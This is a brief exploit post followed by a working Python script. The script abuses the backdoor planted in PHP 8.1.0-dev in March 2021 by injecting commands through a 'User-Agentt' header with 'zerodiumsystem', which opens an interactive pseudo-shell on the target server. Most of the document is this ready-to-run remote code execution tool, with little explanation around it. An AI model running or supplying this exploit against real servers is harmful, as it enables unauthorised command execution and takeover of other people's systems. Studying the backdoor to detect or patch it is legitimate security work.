An early release of PHP, the PHP 8.1.0-dev version was released with a backdoor on March 28th 2021, but the backdoor was quickly discovered and removed. If this version of PHP runs on a server, an attacker can execute arbitrary code by sending the User-Agentt header.
The following exploit uses the backdoor to provide a pseudo shell ont the host.

#!/usr/bin/env python3
import os
import re
import requests

host = input("Enter the full host url:\n")
request = requests.Session()
response = request.get(host)

if str(response) == '<Response [200]>':
    print("\nInteractive shell is opened on", host, "\nCan't acces tty; job crontol turned off.")
    try:
        while 1:
            cmd = input("$ ")
            headers = {
            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
            "User-Agentt": "zerodiumsystem('" + cmd + "');"
            }
            response = request.get(host, headers = headers, allow_redirects = False)
            current_page = response.text
            stdout = current_page.split('<!DOCTYPE html>',1)
            text = print(stdout[0])
    except KeyboardInterrupt:
        print("Exiting...")
        exit

else:
    print("\r")
    print(response)
    print("Host is not available, aborting...")
    exit
